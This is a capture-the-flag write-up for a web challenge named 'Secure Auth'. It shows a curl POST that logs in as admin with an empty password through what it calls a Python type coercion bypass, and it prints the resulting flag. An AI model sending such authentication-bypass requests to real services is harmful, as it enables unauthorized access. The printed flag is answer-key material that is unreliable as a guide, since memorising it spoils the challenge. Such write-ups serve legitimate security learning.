## **Challenge Name: Secure Auth**

### **Description**

A web application with an authentication endpoint that appears to have a vulnerability in how it handles authentication.

**Challenge author**: Unknown

**Challenge URL**: `http://18.212.136.134:5200/`

---

### **Approach**

1. **Initial Investigation**  
   - Examined the authentication endpoint at `/api/authenticate`
   - Found it accepts JSON payloads with username, password, and remember fields

2. **Testing Authentication**  
   - Attempted to authenticate with various payloads
   - Discovered the application uses Python and may be vulnerable to type coercion

3. **Type Coercion Bypass**  
   - Sent a POST request with an empty password string:
     ```bash
     curl -i -X POST http://18.212.136.134:5200/api/authenticate \
       -H "Content-Type: application/json" \
       --data '{"username":"admin","password":"","remember":true}'
     ```
   - The empty password string was accepted due to Python type coercion bypass
   - Successfully authenticated as admin

4. **Retrieving the Flag**  
   - The authentication response contained the flag in the JSON response:
     ```json
     {
       "flag":"FLAG{py7h0n_typ3_c03rc10n_byp4ss}",
       "message":"Authentication successful",
       "role":"admin",
       "success":true,
       "user":"admin"
     }
     ```

---

### **Flag**

```
FLAG{py7h0n_typ3_c03rc10n_byp4ss}
```

---

